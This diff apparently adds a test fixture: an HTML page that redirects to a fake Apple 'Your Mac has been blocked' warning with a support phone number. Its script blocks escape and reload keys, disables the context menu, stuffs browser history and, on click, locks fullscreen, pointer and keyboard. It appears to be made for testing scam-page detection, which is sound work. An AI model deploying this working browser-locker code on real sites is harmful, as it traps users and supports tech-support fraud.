@@ -1,0 +1,74 @@
+<!doctype html>
+<!--
+  Fixture, not a real attack (fictional 555 number): malicious.html plus capture-phase keyCode
+  traps, string onbeforeunload, inline oncontextmenu; on click full screen, locks, history stuffing.
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Loading...</title>
+  </head>
+  <body>
+    <script>
+      const lockScreenHtml = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8" />
+          <title>Apple Security Warning</title>
+          <style>
+            html, body { height: 100%; margin: 0; }
+            body {
+              font-family: -apple-system, Helvetica, Arial, sans-serif;
+              background: #1d1d1f; color: white;
+              display: flex; align-items: center; justify-content: center; text-align: center;
+            }
+            .box { max-width: 600px; padding: 40px; }
+            .phone { font-size: 30px; font-weight: bold; color: #ff453a; margin: 24px 0; }
+          </style>
+        </head>
+        <body oncontextmenu="return false">
+          <div class="box">
+            <h1>Your Mac has been blocked</h1>
+            <p>
+              Spyware was detected on this device. Your passwords are at risk.
+              Do not shut down or restart your Mac.
+            </p>
+            <p>Contact Apple Support now:</p>
+            <div class="phone">+1 (888) 555-0142</div>
+            <p>Reference: 0x8007045d</p>
+          </div>
+          <script>
+            const BLOCKED_KEY_CODES = [27, 116, 122, 123];
+            window.addEventListener('keydown', (e) => {
+              const modifier = e.ctrlKey || e.metaKey;
+              if (BLOCKED_KEY_CODES.includes(e.keyCode) || (modifier && [76, 82, 87].includes(e.keyCode))) {
+                e.preventDefault();
+                e.stopPropagation();
+              }
+            }, true);
+
+            window.onbeforeunload = () => 'Leaving will damage your Mac';
+            window.addEventListener('beforeunload', (e) => { e.preventDefault(); }, true);
+
+            const stuffHistory = () => {
+              for (let i = 0; i < 30; i += 1) { history.pushState({ i }, '', '#' + i); }
+            };
+            window.addEventListener('popstate', stuffHistory);
+
+            document.addEventListener('click', () => {
+              stuffHistory();
+              document.documentElement.requestFullscreen?.().catch(() => {});
+              document.documentElement.requestPointerLock?.();
+              navigator.keyboard?.lock?.().catch(() => {});
+            });
+          <\/script>
+        </body>
+        </html>
+      `;
+
+      const blob = new Blob([lockScreenHtml], { type: 'text/html' });
+      window.location.href = URL.createObjectURL(blob);
+    </script>
+  </body>
+</html>
